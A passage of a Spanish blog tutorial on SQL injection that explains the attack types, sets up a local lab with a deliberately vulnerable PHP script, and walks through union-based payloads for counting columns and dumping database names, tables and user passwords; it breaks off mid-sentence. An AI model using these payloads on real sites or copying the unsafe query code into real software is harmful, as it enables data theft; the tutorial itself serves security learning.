<!DOCTYPE html><html lang="es-ES" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Inyecciones SQL" /><meta name="author" content="xdann1" /><meta property="og:locale" content="es_ES" /><meta name="description" content="Si has entrado en este post es porque quieres aprender sobre las inyecciones SQL, sin embargo, siempre he creido que primero hay que aprender a andar antes de querer correr, por lo que primero aprenderemos que es SQL y para que se utiliza." /><meta property="og:description" content="Si has entrado en este post es porque quieres aprender sobre las inyecciones SQL, sin embargo, siempre he creido que primero hay que aprender a andar antes de querer correr, por lo que primero aprenderemos que es SQL y para que se utiliza." /><link rel="canonical" href="https://xdann1.github.io/posts/inyecciones-sql/" /><meta property="og:url" content="https://xdann1.github.io/posts/inyecciones-sql/" /><meta property="og:site_name" content="xDaNN1" /><meta property="og:image" content="https://xdann1.github.io/assets/img/commons/sqli/sqli.png" /><meta property="og:image:height" content="500" /><meta property="og:image:width" content="800" /><meta property="og:image:alt" content="Banner SQLi" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-07-12T00:00:00+02:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://xdann1.github.io/assets/img/commons/sqli/sqli.png" /><meta name="twitter:image:alt" content="Banner SQLi" /><meta property="twitter:title" content="Inyecciones SQL" /><meta name="twitter:site" content="@xdann1_" /><meta name="twitter:creator" content="@xDaNN1_" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"xdann1","url":"https://xdann1.github.io"},"dateModified":"2023-05-20T22:58:28+02:00","datePublished":"2022-07-12T00:00:00+02:00","description":"Si has entrado en este post es porque quieres aprender sobre las inyecciones SQL, sin embargo, siempre he creido que primero hay que aprender a andar antes de querer correr, por lo que primero aprenderemos que es SQL y para que se utiliza.","headline":"Inyecciones SQL","image":{"width":800,"height":500,"alt":"Banner SQLi","url":"https://xdann1.github.io/assets/img/commons/sqli/sqli.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://xdann1.github.io/posts/inyecciones-sql/"},"url":"https://xdann1.github.io/posts/inyecciones-sql/"}</script><title>Inyecciones SQL | xDaNN1</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="xDaNN1"><meta name="application-name" content="xDaNN1"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/commons/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">xDaNN1</a></div><div class="site-subtitle font-italic">Cybersecurity enthusiast | CTF Player</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>INICIO</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORÍAS</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>ETIQUETAS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVO</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>SOBRE MÍ</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/xdann1" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/xdann1_" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="https://app.hackthebox.com/profile/535069" aria-label="hackthebox" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a> <a href="https://www.linkedin.com/in/danielqueroperez/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="" aria-label="" target="_blank" rel="noopener"> <i class=""></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Inicio </a> </span> <span>Inyecciones SQL</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Entrada</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Buscar..."> </span> <span id="search-cancel" >Cancelar</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 800 500'%3E%3C/svg%3E" data-src="../../assets/img/commons/sqli/sqli.png" class="preview-img bg" alt="Banner SQLi" width="800" height="500" data-proofer-ignore><h1 data-toc-skip>Inyecciones SQL</h1><div class="post-meta text-muted"><div> Por <em> <a href="https://xdann1.github.io">xdann1</a> </em></div><div class="d-flex"><div> <span> Publicado <em class="timeago" data-ts="1657576800" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-07-12 </em> </span> <span> Actualizado <em class="timeago" data-ts="1684616308" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2023-05-20 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="6149 palabras"> <em>34 min</em> de lectura</span></div></div></div><div class="post-content"><p>Si has entrado en este post es porque quieres aprender sobre las inyecciones SQL, sin embargo, siempre he creido que primero hay que aprender a andar antes de querer correr, por lo que primero aprenderemos que es SQL y para que se utiliza.</p><h2 id="qué-es-sql"><span class="mr-2">¿Qué es SQL?</span><a href="#qué-es-sql" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>SQL por sus siglas en inglés significa Lenguaje de Consulta Estructurada (Structured Query Language), es un lenguaje de consulta estructurada diseñado para actualizar, obtener, y calcular información en bases de datos.</p><hr /><h2 id="para-qué-se-utiliza-sql"><span class="mr-2">¿Para qué se utiliza SQL?</span><a href="#para-qué-se-utiliza-sql" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>La mayoría de las aplicaciones web modernas utilizan una estructura de base de datos en el back-end. Dichas bases de datos se utilizan para almacenar y recuperar datos relacionados con la aplicación web, desde el contenido web hasta la información y contenido del usuario, etc. Para que las aplicaciones web sean dinámicas, la aplicación web debe interactuar con una base de datos en tiempo real. A medida que llegan solicitudes HTTP(S) del usuario, el back-end de la aplicación web emitirá consultas a la base de datos para generar la respuesta.</p><hr /><h2 id="inyecciones-sql"><span class="mr-2">Inyecciones SQL</span><a href="#inyecciones-sql" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Una inyección SQL (SQLi) es una vulnerabilidad de seguridad que ocurre cuando un usuario malintencionado pasa una entrada que cambia la consulta SQL final enviada por la aplicación web a la base de datos, en otras palabras, la inyección ocurre cuando una aplicación interpreta la entrada del usuario como código en lugar de una cadena, cambiando el flujo del código y ejecutándolo. Esto le permite al usuario realizar otras consultas no deseadas directamente en la base de datos.</p><p>Hay muchas formas de lograr esto. Para que funcione una inyección SQL, el atacante primero debe inyectar código y luego subvertir la lógica de la aplicación web cambiando la consulta original o ejecutando una completamente nueva. Entonces, el atacante tendrá que inyectar código fuera de los límites esperados de entrada del usuario, por lo que no se ejecuta como una simple entrada del usuario. En el caso más básico, esto se hace inyectando una comilla simple ( ‘) o una comilla doble ( “) para escapar de los límites de entrada del usuario e inyectar datos directamente en la consulta SQL.</p><p>Una vez que un atacante es capaz de inyectar código, debe buscar una forma de ejecutar una consulta SQL diferente. Esto se puede hacer usando código SQL para crear una consulta funcional que ejecute tanto la consulta SQL prevista como la nueva. Hay muchas formas de lograr esto, como usar consultas <code class="language-plaintext highlighter-rouge">STACKED</code> o consultas <code class="language-plaintext highlighter-rouge">UNION</code>. Finalmente, para recuperar el resultado de nuestra nueva consulta, debemos interpretarlo o capturarlo en el front-end de la aplicación web.</p><hr /><h2 id="usos-de-inyecciones-sql"><span class="mr-2">Usos de inyecciones SQL</span><a href="#usos-de-inyecciones-sql" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Una inyección SQL puede tener un impacto tremendo, especialmente si los privilegios en el servidor back-end y la base de datos son muy permisivos.</p><p>Primero, podemos recuperar información secreta/sensible que no debería ser visible para nosotros, como inicios de sesión y contraseñas de usuarios o información de tarjetas de crédito, que luego se pueden usar para otros fines poco éticos. Las inyecciones SQL provocan muchas filtraciones de contraseñas y datos contra sitios web, que luego se reutilizan para robar cuentas de usuarios, acceder a otros servicios o realizar otras acciones maliciosas.</p><p>Otro caso de uso de la inyección de SQL es subvertir la lógica de la aplicación web. El ejemplo más común de esto es omitir el inicio de sesión sin pasar unas credenciales válidas. Otro ejemplo es el acceso a funciones que están bloqueadas para usuarios específicos, como los paneles de administración. Los atacantes también pueden leer y escribir archivos directamente en el servidor de back-end, lo que, a su vez, puede llevar a colocar puertas traseras en el servidor back-end , consiguiendo así control directo sobre él.</p><hr /><h2 id="tipos-de-inyecciones-sql"><span class="mr-2">Tipos de inyecciones SQL</span><a href="#tipos-de-inyecciones-sql" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Las inyecciones SQL se clasifican según de cómo y dónde podemos leer su salida.</p><p><img data-src="/assets/img/commons/sqli/esquema.png" alt="Esquema Inyecciones SQL" class="center-image" data-proofer-ignore> <em>Esquema inyecciones SQL</em></p><ul><li>In-band: la salida de la consulta es mostrada directamente en el front-end, por lo que podemos leerla directamente.<ul><li>Union Based: utiliza la orden UNION para combinar los resultados de varias consultas SELECT, esto nos permite crear una consulta secundaria dentro de la principal<li>Error Based: utilizamos los errores PHP o SQL del front-end para que nos devuelva la salida de la consulta.</ul><li>Blind: no obtenemos la salida de la consulta directamente, tendremos que utilizar la lógica SQL para recuperar la salida letra por letra.<ul><li>Boolean Based: utiliza las condicionales de SQL para controlar si la página devuelve un valor TRUE, es decir, si la letra es válida la página nos respondera , de caso contrario no lo hará.<li>Time Based: utiliza condicionales que retrasan la respuesta de la página si devuelven un valor TRUE, es decir, si la letra es válida la página tardará más de lo normal en responder.</ul><li>Out-of-band: en algunos casos no tendremos acceso directo a la salida de la consulta, por lo que tendremos que redirigir la salida a otro lugar, por ejemplo, a un registro DNS o peticiones HTTP(S).</ul><hr /><h2 id="creación-de-laboratorio-para-practicar-inyecciones-sql"><span class="mr-2">Creación de laboratorio para practicar inyecciones SQL</span><a href="#creación-de-laboratorio-para-practicar-inyecciones-sql" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Saber la teoría está muy bien, sin embargo, esto no nos sirve de nada si no sabemos llevarlo a la práctica. Es por esto que en este apartado profundizaremos en la creación de un laboratorio que nos permita practicar los distintos tipos de inyecciones SQL. Si no quereis crear el laboratorio podéis practicarlas haciendo alguna de las máquinas de plataformas como <a href="https://www.hackthebox.com/">Hack The Box</a> o <a href="https://tryhackme.com/">TryHackme</a>.</p><p>Para la creación de nuestro laboratorio de pruebas utilizaremos el software MariaDB y Apache. Lo primero que tendremos que hacer es iniciar ambos servicios, podéis ver como hacerlo desde <a href="https://geekland.eu/systemctl-administrar-servicios-linux/">aqui</a>.</p><p>Cuando ya tengamos iniciados ambos servicios vamos a proceder a crear la estructura de la base de datos que vamos a utilizar, os dejo un <a href="https://mariadb.com/kb/es/basic-sql-statements/">post</a> en el que explican como hacerlo. Así nos quedarían las dos tablas con sus respectivos datos.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre>Base de datos Tienda

Tabla de Usuarios
+------+----------+--------------+---------------+
| id   | nombre   | contraseña   | rol           |
+------+----------+--------------+---------------+
|    1 | admin    | admin123     | administrador |
|    2 | usuario1 | usuario1_123 | usuario       |
|    3 | usuario2 | usuario2_123 | usuario       |
|    4 | usuario3 | usuario3_123 | usuario       |
|    5 | vendedor | vendedor123  | vendedor      |
+------+----------+--------------+---------------+

Tabla de Productos
+------+---------+---------------------------------------------------+
| id   | nombre  | descripcion                                       |
+------+---------+---------------------------------------------------+
|    1 | teclado | lo puedes usar para escribir                      |
|    2 | raton   | lo usas para interactuar con la interfaz grafica  |
|    3 | monitor | puedes ver cosas en el                            |
|    4 | silla   | te sientas en ella                                |
|    5 | cascos  | puedes escuchar cosas con el                      |
+------+---------+---------------------------------------------------+
</pre></table></code></div></div><p>Vamos a usar el siguiente código para conectar la base de datos a una aplicación web (necesitais un usuario que tenga los privilegios necesarios, os dejo un <a href="https://techexpert.tips/es/mariadb-es/mariadb-crear-una-cuenta-de-superusuario/">post</a> que explica como hacerlo).</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>

<span class="c1">// Datos</span>
<span class="nv">$dbhostname</span> <span class="o">=</span> <span class="s1">'localhost'</span><span class="p">;</span>
<span class="nv">$dbuser</span> <span class="o">=</span> <span class="s1">'usuario'</span><span class="p">;</span>
<span class="nv">$dbpassword</span> <span class="o">=</span> <span class="s1">'contraseña'</span><span class="p">;</span>
<span class="nv">$dbname</span> <span class="o">=</span> <span class="s1">'nombreBasedeDatos'</span><span class="p">;</span>

<span class="c1">//Creamos la conexion</span>
<span class="nv">$connection</span> <span class="o">=</span> <span class="nb">mysqli_connect</span><span class="p">(</span><span class="nv">$dbhostname</span><span class="p">,</span> <span class="nv">$dbuser</span><span class="p">,</span> <span class="nv">$dbpassword</span><span class="p">,</span> <span class="nv">$dbname</span><span class="p">);</span>

<span class="c1">//Comprobamos si se ha hecho bien la conexion</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$connection</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="nf">mysqli_error</span><span class="p">(</span><span class="nv">$connection</span><span class="p">);</span>
    <span class="k">die</span><span class="p">();</span>
<span class="p">}</span>

<span class="c1">// Parametro con el cual recogemos el input</span>
<span class="nv">$input</span><span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'nombre'</span><span class="p">];</span>

<span class="c1">// Definimos consulta a Mariadb</span>
<span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT id, nombre, descripcion FROM Productos WHERE nombre='</span><span class="nv">$input</span><span class="s2">'"</span><span class="p">;</span>

<span class="c1">// Lanzamos la consulta</span>
<span class="nv">$results</span> <span class="o">=</span> <span class="nf">mysqli_query</span><span class="p">(</span><span class="nv">$connection</span><span class="p">,</span> <span class="nv">$query</span><span class="p">);</span>

<span class="c1">// Comprobamos si se ha hecho bien la consulta</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$results</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="nf">mysqli_error</span><span class="p">(</span><span class="nv">$connection</span><span class="p">);</span>
    <span class="k">die</span><span class="p">();</span>
<span class="p">}</span>

<span class="c1">// Obtenemos y mostramos ls resultados de la consulta. Los resultados se almacenan en un array por el cual iteramos</span>
<span class="k">while</span> <span class="p">(</span><span class="nv">$rows</span> <span class="o">=</span> <span class="nf">mysqli_fetch_assoc</span><span class="p">(</span><span class="nv">$results</span><span class="p">))</span> <span class="p">{</span>
	<span class="k">echo</span> <span class="s2">"&lt;table&gt;"</span><span class="p">;</span>
	<span class="k">echo</span> <span class="s2">"&lt;tr&gt;"</span><span class="p">;</span>
	<span class="k">echo</span> <span class="s2">"  &lt;th align='left'&gt; ID &lt;/th&gt;"</span><span class="p">;</span>
	<span class="k">echo</span> <span class="s2">"  &lt;th align='left'&gt; Producto &lt;/th&gt;"</span><span class="p">;</span>
	<span class="k">echo</span> <span class="s2">"  &lt;th align='left'&gt; Descripcion &lt;/th&gt;"</span><span class="p">;</span>
	<span class="k">echo</span> <span class="s2">"&lt;/tr&gt;"</span><span class="p">;</span>
	<span class="k">echo</span> <span class="s2">"&lt;tr&gt;"</span><span class="p">;</span>
	<span class="k">echo</span> <span class="s2">"&lt;td align='left'&gt; "</span> <span class="mf">.</span> <span class="nv">$rows</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">"&lt;/td&gt;"</span><span class="p">;</span>
	<span class="k">echo</span> <span class="s2">"&lt;td align='left'&gt; "</span> <span class="mf">.</span> <span class="nv">$rows</span><span class="p">[</span><span class="s1">'nombre'</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">"&lt;/td&gt;"</span><span class="p">;</span>
	<span class="k">echo</span> <span class="s2">"&lt;td align='left'&gt; "</span> <span class="mf">.</span> <span class="nv">$rows</span><span class="p">[</span><span class="s1">'descripcion'</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">"&lt;/td&gt;"</span><span class="p">;</span>
	<span class="k">echo</span> <span class="s2">"&lt;/tr&gt;"</span><span class="p">;</span>
	<span class="k">echo</span> <span class="s2">"&lt;/table&gt;"</span><span class="p">;</span>
<span class="p">}</span>

<span class="cp">?&gt;</span>
</pre></table></code></div></div><hr /><h2 id="explotación-de-las-inyecciones-sql"><span class="mr-2">Explotación de las inyecciones SQL</span><a href="#explotación-de-las-inyecciones-sql" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>En este apartado pretendo explicar la explotación de todos los tipos de inyecciones SQL, realmente todas se basan en los mismos principios y objetivos por lo que me extenderé más en la explicación del primer tipo (Union Based), ya que los conceptos de sacar información y explotación de privilegios los podemos extrapolar a los demás tipos de inyecciones.</p><p>Tenéis a vuestra disposición varias herramientas que automatizan la explotación de las inyecciones SQL, sin embargo, yo recomiendo que aprendáis a explotarlas por vostros mismos ya que no siempre vais a tener estas herramientas a mano, además siempre está bien aprender nuevas cosas.</p><h3 id="union-based"><span class="mr-2">Union Based</span><a href="#union-based" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Antes de comenzar a explotar la inyección tendremos que comprobar si realmente estamos ante una posible inyección SQL de este tipo, esto lo podemos hacer inyectando código en la consulta. Podemo ver si estamos ante una inyección SQL de este tipo con el siguiente payload <code class="language-plaintext highlighter-rouge">1' UNION SELECT 1-- -</code>. Con esta consulta pueden pasar 3 cosas:</p><ul><li>Que añada el dato de la segunda consulta SELECT sin dar errores<li>Que nos salte el siguiente error: <code class="language-plaintext highlighter-rouge">The used SELECT statements have a different number of columns</code><li>Que no ocurra nada</ul><p>Si nos ocurre cualquiera de los dos primeros casos significará que estamos ante una inyección SQL ya que hemos sido capaces de unir las salidas de dos consultas SELECT utilizando una consulta UNION.</p><p>A priori parece que solo podemos introducir datos dentro del campo del nombre, sin embargo, como hemos visto antes podemos añadir una comilla a la consulta para cerrar el campo, por lo que todo lo que escribamos luego de la comilla quedará fuera de él.</p><p>Por ejemplo, si hacemos esto vamos a ser capaces de inyectar código fuera de los limites del campo, introduzcamos en la consulta el siguiente payload <code class="language-plaintext highlighter-rouge">1' UNION SELECT 1, 2, 3-- -</code>.</p><p><img data-src="/assets/img/commons/sqli/inyeccion_codigo.png" alt="Inyección de código" class="center-image" data-proofer-ignore> <em>Conseguimos inyectar código SQL</em></p><p>Vemos que hemos sido capaces de inyectar código fuera de los limites del campo del nombre, ahora pasaremos a explicar como combinar los resultados de varias consultas SELECT utilizando la orden UNION.</p><p>Para que podamos hacer esto es necesario que ambas consultas SELECT tengan el mismo número de columnas y que almacenen el mismo tipo datos. Cuando queramos poner en practica este tipo de inyección SQL descubriremos que la consulta original no tendrá misma cantidad de columnas que nuestra consulta, por lo que tendremos que arreglarlo.</p><p>Supongamos que la consulta original tiene 3 columnas y la nuestra solamente tiene 2, por lo que tendremos que conseguir de alguna manera que nuestra consulta tenga 3 columnas. Aquí es donde entran los datos basura, los datos basura son aquellos que utilizamos para conseguir tener el mismo número de columnas en ambas consultas SELECT.</p><p>Vamos a hacer una consulta SELECT con 2 columnas que uniremos a la otra consulta SELECT mediante la orden UNION. Nuestro payload sería el siguiente <code class="language-plaintext highlighter-rouge">1' UNION SELECT nombre, contraseña FROM Usuarios-- -</code>.</p><p><img data-src="/assets/img/commons/sqli/error_union.png" alt="Error en consulta UNION" class="center-image" data-proofer-ignore> <em>Error debido a que las consultas SELECT no tienen el mismo número de columnas</em></p><p>Vemos que nos da un error debido a que no tenemos el mismo número de columnas en las dos consultas SELECT (3 columnas y 2 respectivamente), ya que necesitamos de una columna en nuestra consulta para igualar a la original vamos a utilizar los datos basura para añadir una columna más, quedando nuestro payload así <code class="language-plaintext highlighter-rouge">1' UNION SELECT nombre, contraseña, 3 FROM Usuarios-- -</code></p><p><img data-src="/assets/img/commons/sqli/dato_basura.png" alt="Datos basura" class="center-image" data-proofer-ignore> <em>Utilizamos los datos basura para conseguir el mismo número de columnas</em></p><p>Ya sabemos que necesitamos tener las mismas columnas en las dos consultas SELECT para crear una consulta dentro de la principal con la orden UNION, en el ejemplo anterior nosotros ya sabiamos cuantas columnas necesitabamos, sin embargo, cuando queramos poner en práctica esto en otros entornos controlados no vamos a saber cuantas columnas vamos a necesitar, aquí entra en juego la orden ORDER BY.</p><p>La orden ORDER BY nos sirve para realizar un ordenamiento de los datos, nosotros como atacantes nos podemos aprovechar de esto pidiendole que nos ordene los datos a partir de ciertas columnas, por lo que si le pedimos que nos ordene por la quinta columna cuando la tabla solo tiene 4 columnas nos saltará un error. De esta forma vamos probando hasta encontrar un número con el cual no provocamos un error y que el siguiente si lo provoque.</p><p>Vamos a descubrir cuantas columnas tiene la tabla Productos utilizando la orden ORDER BY, probemos primero con 4 columnas, quedando nuestro payload así <code class="language-plaintext highlighter-rouge">1' ORDER BY 4-- -</code></p><p><img data-src="/assets/img/commons/sqli/order_by.png" alt="Error en la consulta" class="center-image" data-proofer-ignore> <em>Error debido a que la tabla no tiene ese número de columnas</em></p><p>Vemos que nos da un error por lo que el número de columnas tiene que ser menor que 4, probemos ahora con 3 columnas.</p><p><img data-src="/assets/img/commons/sqli/order_by2.png" alt="Encontramos el número correcto" class="center-image" data-proofer-ignore> <em>Encontramos el número de columnas que tiene la tabla</em></p><p>Ahora no nos saltará un error por lo que ya sabemos que la tabla tiene 3 columnas ya que el número siguiente nos da error y este no. Ya sabiendo la cantidad de columnas que tiene la tabla vamos a empezar a recopilar información básica sobre la base de datos antes de empezar con la explotación.</p><div class="table-wrapper"><table><thead><tr><th style="text-align: left">Información a obtener<th style="text-align: left">Software<th style="text-align: right">Consulta<tbody><tr><td style="text-align: left">Nombre de la base de datos<td style="text-align: left">Todos<td style="text-align: right">database()<tr><td style="text-align: left">Versión de la base de datos<td style="text-align: left">MySQL<td style="text-align: right">@@version<tr><td style="text-align: left"> <td style="text-align: left">Oracle<td style="text-align: right">v$verrsion<tr><td style="text-align: left"> <td style="text-align: left">PostgreSQL<td style="text-align: right">version()<tr><td style="text-align: left">Usuario que la está corriendo<td style="text-align: left">Todos<td style="text-align: right">user()</table></div><p>Como solo necesitamos 3 columnas vamos a introducir 3 consultas para conseguir información, así que no vamos a utilizar datos basura para conseguir más columnas. Vamos a mandar el siguiente payload <code class="language-plaintext highlighter-rouge">1' UNION SELECT database(), @@version, user()-- -</code>.</p><p><img data-src="/assets/img/commons/sqli/informacion_basica.png" alt="Información Básica" class="center-image" data-proofer-ignore> <em>Recopilación de información Básica</em></p><p>Ya hemos recopilado información que nos puede ser útil, ahora voy a pasar a explicar la explotación de la inyecciones SQL de tipo Union Based.</p><p>Lo primero de todo, necesitaremos saber que bases de datos existen. Esto lo podemos averiguar consultando la columna llamada <code class="language-plaintext highlighter-rouge">schema_name</code> de la tabla <code class="language-plaintext highlighter-rouge">schemata</code> de la base de datos <code class="language-plaintext highlighter-rouge">information_schema</code>. Nuestro payload quedaría así <code class="language-plaintext highlighter-rouge">1' UNION SELECT schema_name, 2, 3 FROM information_schema.schemata-- -</code></p><p><img data-src="/assets/img/commons/sqli/basededatos_union.png" alt="Bases de datos existentes" class="center-image" data-proofer-ignore> <em>Bases de datos existentes</em></p><p>Las tres primeras bases de datos no nos interesan ahora mismo, veamos que tablas contiene la base de datos llamada <code class="language-plaintext highlighter-rouge">Tienda</code>. Nuestro payload para sacar las tablas quedaría así <code class="language-plaintext highlighter-rouge">1' UNION SELECT table_name, 2, 3 FROM information_schema.tables WHERE table_schema="Tienda"-- -</code>.</p><p><img data-src="/assets/img/commons/sqli/tablas_union.png" alt="Tablas existentes" class="center-image" data-proofer-ignore> <em>Tablas existentes</em></p><p>Vamos a sacar las columnas existentes en la tabla de <code class="language-plaintext highlighter-rouge">Usuarios</code> con el siguiente payload <code class="language-plaintext 